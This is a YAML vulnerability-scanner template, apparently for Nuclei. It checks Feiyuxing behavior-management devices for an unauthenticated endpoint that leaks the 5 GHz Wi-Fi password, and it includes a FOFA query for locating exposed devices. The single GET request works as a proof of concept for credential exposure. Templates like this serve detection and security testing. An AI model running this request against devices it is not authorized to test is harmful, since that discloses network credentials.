id: feiyuxing-info-leak

info:
  name: Feiyuxing Information - Exposure
  author: SleepingBag945
  severity: high
  description: |
    Feiyuxing enterprise-level intelligent online behavior management system has authority bypass and information leakage vulnerabilities, which can obtain administrator rights and user passwords
  reference:
    - https://github.com/zan8in/afrog/blob/8807461dce8672f7306af4579054834ce2475296/v2/pocs/afrog-pocs/vulnerability/feiyuxing-info-leak.yaml
  metadata:
    verified: "true"
    fofa-query: title="飞鱼星企业级智能上网行为管理系统"
  tags: feiyuxing,iot,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/request_para.cgi?parameter=wifi_get_5g_host"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body_1,"WPA-PSK")'
          - 'contains(body,"wl_passwd_5g")'
        condition: or
